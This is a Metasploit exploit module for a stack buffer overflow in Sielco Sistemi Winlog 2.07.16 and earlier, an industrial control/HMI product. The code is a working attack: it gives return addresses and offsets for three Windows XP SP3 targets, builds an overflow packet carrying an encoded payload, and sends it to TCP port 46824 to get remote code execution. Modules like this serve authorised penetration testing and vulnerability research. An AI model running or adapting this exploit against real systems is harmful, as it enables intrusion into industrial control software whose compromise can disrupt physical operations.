require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Sielco Sistemi Winlog <= 2.07.16',
			'Description'    => %q{
				This module exploits a stack based buffer overflow
				found in Sielco Sistemi Winlog <= 2.07.16. The
				overflow is triggered during the parsing of a
				maliciously crafted packet
			},
			'Author'         => [ 'James Fitts' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: $',
			'References'     =>
				[
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'Space' => 150,
					'BadChars' => "\x00\x0a\x0d\x20",
					'DisableNops' => 'True',
					# add esp, -5500
					'PrependEncoder' => "\x81\xc4\x84\xea\xff\xff",
					'Compat'	=>
						{
							'SymbolLookup' => 'ws2ord',
						}
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[
						'Windows XP SP3 EN (Automatic Washing System Demo)',
							{
								# vcldb40.bpl
								# jmp esp
								'Ret' => 0x46035f8b,
								'Offset' => 160,
								'jmp' => "\xe9\x56\xff\xff\xff",
							}
					],
					[
						'Windows XP SP3 EN (Car Simulation)',
							{
								# vcl40.bpl
								# jmp esp
								'Ret' => 0x4003eb6b,
								'Offset' => 175,
								'jmp' => "\xe9\x46\xff\xff\xff",
							}
					],
					[ 
						'Windows XP SP3 EN (Ceramics Kiln)', 
							{ 
								# ter19.dll
								# push esp/ retn
								'Ret' => 0x258b4432,
								'Offset' => 176,
								'jmp' => "\xe9\x46\xff\xff\xff",
							} 
					],
				],
			'DefaultTarget' => 0,
			'DisclosureDate' => 'Jun 26 2012'))

		register_options([Opt::RPORT(46824)], self.class)
	end

	def exploit
		connect

		boom =  rand_text_alpha_upper(20)
		boom << 'x'
		boom << rand_text_alpha_upper(target['Offset'])
		boom << [target.ret].pack('V')
		boom << "\x41" * 4
		boom << target['jmp']
		boom << "\xcc" * (281 - boom.length)

		boom[22,4] = "\x41" * 4
		boom[26,payload.encoded.length] = payload.encoded

		print_status("Trying target #{target.name}...")
		sock.put(boom)

		handler
	end

end